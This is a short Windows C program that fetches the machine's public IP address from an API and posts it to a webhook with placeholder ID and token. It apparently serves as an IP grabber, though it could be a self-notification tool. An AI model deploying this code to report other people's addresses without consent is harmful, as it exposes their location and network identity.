#include <stdio.h>

#include <windows.h>
#include <winhttp.h>

#include "helper.h"

LPCWSTR webhookId = L"WebhookIDHere";
LPCWSTR webhookToken = L"WebhookTokenHere";

int main()
{
	HINTERNET hSession;
	while (1)
	{
		hSession = WinHttpOpen(L"Hooker", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
		if (hSession == NULL)
			continue;
		break;
	}

	// Buffer Setup for Recieving IP
	char buffer[64];
	DWORD bytesRead;
	memset(buffer, 0, 64);
	
	// Get IP from API
	getIp(hSession, buffer, &bytesRead);

	// Send Webhook
	sendWebhook(hSession, webhookId, webhookToken, buffer, bytesRead);

	WinHttpCloseHandle(hSession);
	return 0;
}